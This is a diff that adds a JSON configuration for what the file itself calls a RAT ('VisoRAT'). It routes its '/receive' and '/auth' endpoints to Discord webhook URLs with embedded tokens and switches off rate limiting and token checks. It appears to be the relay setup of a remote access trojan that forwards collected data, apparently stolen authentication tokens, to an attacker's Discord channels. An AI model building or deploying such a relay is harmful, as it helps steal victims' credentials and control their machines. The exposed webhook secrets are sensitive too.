@@ -1,0 +1,38 @@
+{
+    "security": {
+        "rate_limit_seconds": 0,
+        "min_token_length": 0,
+        "check_duplicate_tokens": false
+    },
+    "endpoints": {
+        "/receive": {
+            "webhooks": [
+                {
+                    "url": "https://discord.com/api/webhooks/1489001298220027946/tOQk5AtZPpCVirEJBxrt4h5K9V2ULCDZ4khEbUtBux0Sl0X8GFDjIFmv6DHIPm4BI89A",
+                    "name": "D Hooked RAT",
+                    "footer": "VisoRAT",
+                    "color": 7414964,
+					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                },
+                {
+                    "url": "https://discord.com/api/webhooks/1489001298220027946/tOQk5AtZPpCVirEJBxrt4h5K9V2ULCDZ4khEbUtBux0Sl0X8GFDjIFmv6DHIPm4BI89A", 
+                    "name": "RAT",
+                    "footer": "VisoRAT",
+                    "color": 7414964,
+					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                }
+            ]
+        },
+        "/auth": {
+            "webhooks": [
+                {
+                    "url": "https://discord.com/api/webhooks/1489001298220027946/tOQk5AtZPpCVirEJBxrt4h5K9V2ULCDZ4khEbUtBux0Sl0X8GFDjIFmv6DHIPm4BI89A",
+                    "name": "Not D Hooked RAT",
+                    "footer": "VisoRAT",
+                    "color": 7414964,
+					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                }
+            ]
+        }
+    }
+}
